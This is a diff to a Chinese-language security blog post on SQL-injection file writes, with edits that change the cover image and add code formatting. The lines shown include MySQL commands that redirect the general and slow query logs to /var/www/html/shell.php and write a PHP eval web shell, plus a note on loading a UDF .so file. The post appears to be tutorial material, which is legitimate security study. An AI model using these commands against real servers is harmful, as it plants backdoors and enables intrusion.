@@ -4,7 +4,7 @@ description: "SQL 注入写文件与上传利用总结，梳理利用条件、�
 pubDate: "2026-03-26"
 updatedDate: "2026-03-26"
 tags: ["SQL", "文件上传", "Web安全"]
-cover: auto
+cover: "IMG_20260701_150811_838..webp"
 coverAlt: "SQL upload 的文章封面"
 draft: false
 ---
@@ -42,7 +42,7 @@ draft: false
 SET GLOBAL general_log = ON;
 SET GLOBAL general_log_file = "/var/www/html/shell.php";
 
-然后select "<?php eval($_POST[1]);?>"
+然后 select `"<?php eval($_POST[1]);?>"`
 
 
 **第二种慢查询日志利用为** ：
@@ -50,7 +50,7 @@ SET GLOBAL slow_query_log=ON;
 SET GLOBAL slow_query_log_file="/var/www/html/shell.php";
 SET GLOBAL long_query_time=1;
 
-然后SELECT "<?php eval($_POST[log]);?>" FROM users WHERE sleep(11);
+然后执行 `SELECT "<?php eval($_POST[log]);?>" FROM users WHERE sleep(11);`
 
 **udf** ：
 利用dumpfile可以写入二进制文件的效果，写入一个.so文件，然后再给这个文件权限，将其作为函数执行
